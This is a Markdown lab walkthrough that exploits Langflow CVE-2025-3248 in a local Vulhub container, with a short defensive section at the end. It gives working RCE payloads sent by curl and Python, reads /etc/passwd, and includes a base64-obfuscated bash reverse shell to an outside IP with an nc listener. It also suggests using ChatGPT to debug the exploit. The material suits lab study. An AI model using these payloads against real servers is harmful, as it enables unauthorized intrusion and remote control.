# ğŸ§¨ Vibe Hacking and Exploiting Langflow (CVE-2025-3248)

> ğŸ§  Learn how to exploit insecure "vibes" in AI tools by walking through a real-world Remote Code Execution (RCE) in Langflow.

---

## ğŸ“Œ Overview

* **Target**: Langflow < 1.3.0
* **Vulnerability**: Unauthenticated RCE via unsafe code validation
* **CVE**: [CVE-2025-3248](https://www.exploit-db.com/exploits/52262)
* **Category**: Vibe Hacking, Developer Tool Exploitation
* **Skill Level**: Intermediate

---

## âš™ï¸ Lab Setup (Vulhub)

### 1. ğŸ³ Start the Vulnerable Container

```bash
cd ~/labs/vulhub/langflow/CVE-2025-3248
docker compose up -d
```

This launches a vulnerable Langflow instance at:

```
http://localhost:7860
```

### 2. âœ… Confirm It's Running

```bash
docker compose ps
```

You should see:

```
0.0.0.0:7860->7860/tcp
```

### 3. ğŸ” Open in Browser

Go to [http://localhost:7860](http://localhost:7860) and confirm the Langflow UI loads.

---

## ğŸ“„ Check README for Exploit Clues

Langflowâ€™s Vulhub folder often includes a pre-built payload in the README.

```bash
cat README.md
```

Look for a payload like this:

```json
{
  "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']).decode())\")\ndef foo():\n  pass"
}
```

This tells you the vulnerability involves:

* `@exec(...)` decorator trick
* `subprocess` call inside an exception
* Returning output via Langflow's `function.errors` field

---

## ğŸ’£ Try the Exploit (Manually)

### Option A: Using curl

```bash
curl -X POST http://localhost:7860/api/v1/validate/code \
  -H "Content-Type: application/json" \
  -d '{"code":"@exec(\"raise Exception(__import__(\u0027subprocess\u0027).check_output([\u0027id\u0027]).decode())\")\ndef foo():\n  pass"}'
```

---

### Option B: Using Python (`exploit2.py`)

```python
import requests

url = "http://localhost:7860/api/v1/validate/code"

payload = {
    "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']).decode())\")\ndef foo():\n  pass"
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, headers=headers, json=payload, timeout=10)
print(f"[*] Status Code: {response.status_code}")
print(f"[*] Response: {response.text}")
```

Run it:

```bash
uv venv critical
source critical/bin/activate
uv pip install requests
uv run python exploit2.py
```

âœ… You should see:

```
[*] Status Code: 200
[*] Response: {"function":{"errors":["b'uid=0(root) gid=0(root) groups=0(root)\\n'"]}}
```

---

## ğŸ§  Why This Works

Langflowâ€™s `/api/v1/validate/code` endpoint:

* Accepts Python code as input
* Executes decorators like `@exec(...)`
* Doesn't sandbox user input
* Doesnâ€™t require authentication

This combo = RCE.

---

## ğŸ§° Using ExploitDB's PoC

Grab the full PoC from:
ğŸ“ [https://www.exploit-db.com/exploits/52262](https://www.exploit-db.com/exploits/52262)

Save it as `exploit.py`, then run:

```bash
uv pip install colorama
uv run python exploit.py http://localhost:7860 "id"
```

> If it fails (e.g., syntax error, empty response), use ChatGPT to debug â€” paste the code + error.

---

## ğŸ› ï¸ Use ChatGPT for Debugging

If you hit errors like:

* `SyntaxWarning: invalid escape sequence`
* `function.errors: []`
* `list index out of range`

Paste into ChatGPT and ask:

> â€œCan you help fix this Langflow exploit? Here's the code and response.â€

GPT can:

* Escape payloads safely
* Refactor payload logic
* Add error-handling
* Debug missing responses

---

## ğŸ” Expanding the Attack

### âœ… Try Other Commands

```bash
uv run python exploit.py http://localhost:7860 "whoami"
uv run python exploit.py http://localhost:7860 "cat /etc/passwd"
```

### âœ… Reverse Shell (Optional)

1. Start a listener:

```bash
nc -lvnp 9001
```

2. Create base64 payload:

```python
payload = {
  "code": "@exec(\"import base64;exec(base64.b64decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85MDAxIDA+JjE='))\")\ndef foo():\n  pass"
}
```

Replace the base64 with your reverse shell and correct IP.

---

## ğŸ›¡ï¸ Defending Against Vibe Hacking

* ğŸ” Disable unsafe endpoints in production
* ğŸ§ª Validate code statically, not dynamically
* ğŸ”’ Add auth to all internal endpoints
* ğŸ•µï¸â€â™€ï¸ Monitor open ports and exposed containers

---

## âœ… Final Checklist

| âœ… Task                         | Status      |
| ------------------------------ | ----------- |
| Launch vulnerable container    | âœ…           |
| Verify Langflow is running     | âœ…           |
| Check README for payload       | âœ…           |
| Test PoC via Python or curl    | âœ…           |
| Get `uid=0(root)` confirmation | âœ…           |
| Use ChatGPT to fix errors      | âœ…           |
| Run other commands             | âœ…           |
| Try reverse shell              | âœ…           |

---

## ğŸ“¦ Files to Save

* `exploit.py` â†’ Full color-coded ExploitDB PoC
* `exploit2.py` â†’ Minimal clean Python PoC
* `payload.json` â†’ Raw JSON test payload
* `README.md` â†’ Keep notes and code snippets

---

## ğŸ“˜ Summary

| Concept          | What You Did                                 |
| ---------------- | -------------------------------------------- |
| Vibe Hacking     | Identified a dev endpoint that executes code |
| Payload Crafting | Built `@exec(...)` Python injection          |
| Exploitation     | Achieved unauthenticated RCE                 |
| ChatGPT          | Used to debug and iterate                    |
| Automation       | Ran code via Python scripts                  |
| Post-exploit     | Reverse shell & file reads                   |

---
